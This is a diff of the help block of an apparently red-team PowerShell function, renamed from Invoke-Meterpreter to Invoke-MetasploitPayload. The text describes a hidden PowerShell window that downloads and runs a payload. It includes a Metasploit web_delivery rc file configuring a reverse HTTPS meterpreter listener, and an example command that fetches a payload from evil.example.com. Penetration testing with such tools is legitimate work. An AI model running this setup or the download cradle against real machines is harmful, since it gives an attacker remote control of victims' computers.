@@ -1,18 +1,19 @@
-function Invoke-Meterpreter 
+function Invoke-MetasploitPayload 
 {
 <#
 .SYNOPSIS
-Kick off a reverse meterpreter session using Metasploits exploit/multi/script/web_delivery payload
+Kick off a Metasploit Payload using the exploit/multi/script/web_delivery module
 Author: Jared Haight (@jaredhaight)
-License: BSD 3-Clause
+License: MIT
 Required Dependencies: None
 Optional Dependencies: None
  
 .DESCRIPTION
-Spawns a new, hidden PowerShell window that intiates a reverse meterpreter shell to a specified server.
+Spawns a new, hidden PowerShell window that downloads and executes a Metasploit payload from a specified URL.
 
-This relies on the exploit/multi/scripts/web_delivery metasploit payload. The web delivery payload creates
-two endpoints, one to download the script and other to listen for the reverse shell.
+This relies on the exploit/multi/scripts/web_delivery metasploit module. The web_delivery module generates a script for
+a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle
+starting up the listener for that payload. 
 
 An example rc file is below (or you can just type the commands manually). It does the following:
 
@@ -21,7 +22,7 @@ An example rc file is below (or you can just type the commands manually). It doe
 * Sets the payload being served to windows/meterpreter/reverse_https
 * Sets the payload to listen on port 443 (LPORT) on all IPs (LHOST)
 
-====== invoke-meterpreter rc file ======
+====== Invoke-MetasploitPayload rc file ======
 use exploit/multi/script/web_delivery
 set SRVHOST 0.0.0.0
 set SRVPORT 8443
@@ -31,9 +32,7 @@ set payload windows/meterpreter/reverse_https
 set LHOST 0.0.0.0
 set LPORT 443
 run -j
-==== end invoke-meterpreter rc file ====
-
-
+==== end Invoke-MetasploitPayload rc file ====
 
 .PARAMETER url
 This is the URL for the download cradle, by default it will be something 
@@ -42,7 +41,7 @@ like "https://evil.example.com/[Random Chars]"
 .EXAMPLE
 Connects to a URL at evil.example.com to download the payload
 
-PS> invoke-meterpreter -url https://evil.example.com/2k1isEdsl
+PS> Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl
 
 
 .NOTES
